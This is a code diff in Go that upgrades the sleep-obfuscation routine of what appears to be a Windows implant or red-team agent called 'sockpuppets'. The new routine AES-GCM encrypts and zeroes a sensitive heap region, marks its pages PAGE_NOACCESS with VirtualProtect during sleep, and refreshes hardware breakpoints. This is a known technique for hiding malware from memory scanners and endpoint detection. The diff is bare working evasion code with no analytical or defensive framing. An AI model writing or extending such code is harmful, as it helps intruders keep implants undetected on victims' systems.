@@ -3,6 +3,8 @@
 package main
 
 import (
+	"crypto/aes"
+	"crypto/cipher"
 	"crypto/rand"
 	"sync"
 	"time"
@@ -89,33 +91,54 @@ func readSensitive(offset uintptr) []byte {
 	return out
 }
 
-func sleepEncrypted(duration time.Duration) {
-	defer func() { recover() }()
-	refreshHardwareBreakpoints()
-
-	if sensitiveHeap == 0 || sensitiveHeapUsed == 0 {
+func maskSleep(mem []byte, duration time.Duration, lock bool) {
+	key := make([]byte, 32)
+	if _, err := rand.Read(key); err != nil {
 		time.Sleep(duration)
 		return
 	}
-
-	var key [32]byte
-	rand.Read(key[:])
-
-	mem := unsafe.Slice((*byte)(unsafe.Pointer(sensitiveHeap)), sensitiveHeapUsed)
-	for i := range mem {
-		mem[i] ^= key[i%32]
+	block, err := aes.NewCipher(key)
+	if err != nil {
+		time.Sleep(duration)
+		return
 	}
-
+	gcm, err := cipher.NewGCM(block)
+	if err != nil {
+		time.Sleep(duration)
+		return
+	}
+	nonce := make([]byte, gcm.NonceSize())
+	rand.Read(nonce)
+	plain := append([]byte(nil), mem...)
+	ct := gcm.Seal(nil, nonce, plain, []byte("sockpuppets-sleep-mask-v1"))
+	for i := range mem {
+		mem[i] = 0
+	}
 	var oldProtect uint32
-	pVirtualProtect.Call(sensitiveHeap, sensitiveHeapSize, PAGE_NOACCESS,
-		uintptr(unsafe.Pointer(&oldProtect)))
-
-	time.Sleep(duration)
-
-	pVirtualProtect.Call(sensitiveHeap, sensitiveHeapSize, PAGE_READWRITE,
-		uintptr(unsafe.Pointer(&oldProtect)))
-
-	for i := range mem {
-		mem[i] ^= key[i%32]
+	if lock && sensitiveHeap != 0 {
+		pVirtualProtect.Call(sensitiveHeap, sensitiveHeapSize, PAGE_NOACCESS,
+			uintptr(unsafe.Pointer(&oldProtect)))
 	}
+	time.Sleep(duration)
+	if lock && sensitiveHeap != 0 {
+		pVirtualProtect.Call(sensitiveHeap, sensitiveHeapSize, PAGE_READWRITE,
+			uintptr(unsafe.Pointer(&oldProtect)))
+	}
+	out, err := gcm.Open(nil, nonce, ct, []byte("sockpuppets-sleep-mask-v1"))
+	if err == nil && len(out) == len(mem) {
+		copy(mem, out)
+	}
+}
+
+func sleepEncrypted(duration time.Duration) {
+	defer func() { recover() }()
+	refreshHardwareBreakpoints()
+	if sensitiveHeap == 0 || sensitiveHeapUsed == 0 {
+		local := make([]byte, 32)
+		rand.Read(local)
+		maskSleep(local, duration, false)
+		return
+	}
+	mem := unsafe.Slice((*byte)(unsafe.Pointer(sensitiveHeap)), sensitiveHeapUsed)
+	maskSleep(mem, duration, true)
 }
